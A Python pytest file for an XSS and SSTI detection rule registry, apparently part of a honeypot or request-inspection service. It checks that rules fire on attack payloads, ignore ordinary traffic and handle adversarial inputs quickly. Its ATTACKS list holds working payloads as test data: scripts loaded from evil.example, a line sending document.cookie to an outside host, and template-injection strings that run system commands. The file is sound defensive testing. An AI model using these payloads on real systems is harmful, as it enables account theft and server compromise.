import time
from datetime import UTC, datetime
from ipaddress import ip_address
from uuid import uuid4

import pytest

from domain.captured_request import CapturedRequest
from workers.detector.rules import RuleRegistry
from workers.detector.ssti import RULES as SSTI_RULES
from workers.detector.xss import RULES as XSS_RULES


def _request(
    *,
    path: str = "/",
    query: str = "",
    body: str = "",
    headers: list[tuple[str, str]] | None = None,
) -> CapturedRequest:
    return CapturedRequest(
        ts=datetime(2026, 1, 1, tzinfo=UTC),
        session_id=uuid4(),
        world_id="w",
        ip=ip_address("203.0.113.9"),
        method="GET",
        path=path,
        query=query,
        body_excerpt=body,
        headers=headers or [],
    )


@pytest.fixture(scope="module")
def registry() -> RuleRegistry:
    registry = RuleRegistry()
    for rule in (*XSS_RULES, *SSTI_RULES):
        registry.register(rule)
    return registry


def _fired(registry: RuleRegistry, request: CapturedRequest) -> set[str]:
    return {d.rule for d in registry.evaluate(request)}


# (query string, rule that must fire)
ATTACKS = [
    ("q=<script>alert(1)</script>", "xss.script_tag"),
    ("q=<SCRIPT SRC=//evil.example/x.js>", "xss.script_tag"),
    ("q=< script >x", "xss.script_tag"),
    ("q=<img src=x onerror=alert(1)>", "xss.event_handler"),
    ("q=<body onload=fetch('//x')>", "xss.event_handler"),
    ("q=<svg/onload=alert(1)>", "xss.event_handler"),
    ('name=" onmouseover="alert(1)', "xss.event_handler"),
    ("name=x' autofocus onfocus='y", "xss.event_handler"),
    ('u=<a href="javascript:alert(1)">x</a>', "xss.javascript_uri"),
    ("redirect=javascript:alert(document.domain)", "xss.javascript_uri"),
    ("redirect=data:text/html;base64,PHNjcmlwdD4=", "xss.javascript_uri"),
    ("q=<iframe src=//evil.example>", "xss.dangerous_tag"),
    ("q=<object data=x>", "xss.dangerous_tag"),
    ('q=<meta http-equiv="refresh" content="0;url=//x">', "xss.dangerous_tag"),
    ("q=<base href=//evil.example/>", "xss.dangerous_tag"),
    ("q='-alert(1)-'", "xss.dom_sink"),
    ("q=x;prompt`1`", "xss.dom_sink"),
    ("q=1;new Image().src='//x/?'+document.cookie", "xss.dom_sink"),
    ("q=eval(atob('YWxlcnQoMSk='))", "xss.dom_sink"),
    ("q=String.fromCharCode(88,83,83)", "xss.dom_sink"),
    ("name={{7*7}}", "ssti.expression_probe"),
    ("name={{ 7 * 7 }}", "ssti.expression_probe"),
    ("name={{'7'*7}}", "ssti.expression_probe"),
    ("name=${7*7}", "ssti.expression_probe"),
    ("name=<%= 7*7 %>", "ssti.expression_probe"),
    ("name=#{7*7}", "ssti.expression_probe"),
    ("name=@(7*7)", "ssti.expression_probe"),
    ("name={{''.__class__.__mro__[1].__subclasses__()}}", "ssti.python_introspection"),
    ("name={{request|attr('__class__')}}", "ssti.python_introspection"),
    ("name={{x['__globals__']}}", "ssti.python_introspection"),
    ("name={{lipsum.__globals__.os.popen('id').read()}}", "ssti.template_rce"),
    ("name={{cycler.__init__.__globals__.os.popen('id')}}", "ssti.template_rce"),
    ("name={{config}}", "ssti.template_rce"),
    ("name={{_self.env.registerUndefinedFilterCallback('exec')}}", "ssti.template_rce"),
    ('name=<#assign ex="freemarker.template.utility.Execute"?new()>', "ssti.template_rce"),
    ("name=${T(java.lang.Runtime).getRuntime().exec('id')}", "ssti.template_rce"),
    ("name=<%= system('id') %>", "ssti.template_rce"),
    ("name=<%= `id` %>", "ssti.template_rce"),
    ("name=<% import os %>", "ssti.template_rce"),
]


@pytest.mark.parametrize(("query", "rule"), ATTACKS, ids=[a[0][:50] for a in ATTACKS])
def test_attack_fires_expected_rule(registry: RuleRegistry, query: str, rule: str) -> None:
    assert rule in _fired(registry, _request(query=query))


@pytest.mark.parametrize(
    ("query", "rule"),
    [
        ("q=%3Cscript%3Ealert(1)%3C/script%3E", "xss.script_tag"),
        ("q=%253Cscript%253E", "xss.script_tag"),  # double-encoded
        ("q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "xss.event_handler"),
        ("q=%3Cscr%00ipt%3E", "xss.script_tag"),  # NUL byte
        ("name=%7B%7B7*7%7D%7D", "ssti.expression_probe"),
        ("name=%24%7B7*7%7D", "ssti.expression_probe"),
    ],
)
def test_encoded_payloads_are_still_detected(registry: RuleRegistry, query: str, rule: str) -> None:
    assert rule in _fired(registry, _request(query=query))


def test_payload_in_body_path_and_headers(registry: RuleRegistry) -> None:
    xss = "<script>alert(1)</script>"
    ssti = "{{7*7}}"

    assert "xss.script_tag" in _fired(registry, _request(body=f'{{"comment": "{xss}"}}'))
    assert "xss.script_tag" in _fired(registry, _request(path=f"/search/{xss}"))
    assert "xss.script_tag" in _fired(registry, _request(headers=[("Referer", f"http://x/{xss}")]))
    assert "ssti.expression_probe" in _fired(registry, _request(body=f"name={ssti}"))
    assert "ssti.expression_probe" in _fired(registry, _request(path=f"/hello/{ssti}"))
    assert "ssti.expression_probe" in _fired(
        registry, _request(headers=[("User-Agent", f"Mozilla/5.0 {ssti}")])
    )


def test_detection_carries_rule_metadata_and_excerpt(registry: RuleRegistry) -> None:
    detections = registry.evaluate(
        _request(query="q=<script>x</script>&n=${T(java.lang.Runtime).getRuntime().exec('id')}")
    )

    by_rule = {d.rule: d for d in detections}
    assert by_rule["xss.script_tag"].matched_excerpt.lower() == "<script"
    assert by_rule["xss.script_tag"].category == "xss"
    assert by_rule["ssti.template_rce"].category == "ssti"
    assert by_rule["ssti.template_rce"].severity.value == "critical"


# Ordinary traffic that must stay quiet. Each looks a little like an attack.
CLEAN = [
    "q=javascript tutorial",
    "q=javascript: the good parts",
    "q=how to use an alert box",
    "q=onclick handler docs",
    "q=online=true&onsale=1",
    "q=a<b and c>d",
    "q=I <3 you",
    "q=5 > 3",
    "q=svg icons",
    "q=iframe vs object",
    "q=what is 7*7",
    "q=7*7=49",
    "text=use {{name}} as placeholder",
    "text=total ${price} each",
    "text=#{count} items",
    "q=<b>bold</b> and <i>italic</i>",
    "q=<3",
    "q=__init__ method in python",
    "q=jinja2 templates",
    "q=document your code",
    "q=config file",
    "q=request a quote",
    "q=eval results",
    "email=a%2Bb%40example.com",
    "page=2&limit=50&filter=in_stock",
]


@pytest.mark.parametrize("query", CLEAN)
def test_ordinary_queries_do_not_fire(registry: RuleRegistry, query: str) -> None:
    assert _fired(registry, _request(query=query)) == set()


def test_ordinary_requests_do_not_fire(registry: RuleRegistry) -> None:
    request = _request(
        path="/api/v1/products/42",
        body='{"title": "Rock & Roll", "comment": "5 > 3, a<b, it\'s great", "tpl": "{{name}}"}',
        headers=[
            ("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"),
            ("Accept", "text/html,application/xhtml+xml;q=0.9,*/*;q=0.8"),
            ("Referer", "https://shop.example/search?q=shoes&sort=price"),
            ("Cookie", "session=abc123; theme=dark"),
        ],
    )

    assert _fired(registry, request) == set()


def test_rule_set_is_consistent() -> None:
    for rules, family in ((XSS_RULES, "xss"), (SSTI_RULES, "ssti")):
        assert all(rule.category == family for rule in rules)
        assert all(rule.name.startswith(f"{family}.") for rule in rules)

    names = [rule.name for rule in (*XSS_RULES, *SSTI_RULES)]
    assert len(names) == len(set(names))


@pytest.mark.parametrize(
    "body",
    [
        "<" * 8000,
        "<a " + "b " * 4000,
        "<img " + "x" * 8000,
        '<a href="' + " " * 8000,
        '"' + " " * 8000 + "on",
        "{{" * 4000,
        "{{ " + "1" * 8000,
        "{{" + "a" * 8000,
        "{%" + " " * 8000,
        "<%=" + " " * 8000,
        "${" + "7*" * 4000,
        "javascript" + " " * 8000 + ":",
    ],
    ids=[
        "lt-spam",
        "tag-attr-spam",
        "tag-long",
        "href-spaces",
        "quote-spaces",
        "brace-spam",
        "digits",
        "brace-long",
        "block-spaces",
        "erb-spaces",
        "dollar-arith",
        "js-spaces",
    ],
)
def test_adversarial_input_is_processed_quickly(registry: RuleRegistry, body: str) -> None:
    started = time.perf_counter()
    registry.evaluate(_request(body=body))

    assert time.perf_counter() - started < 0.5
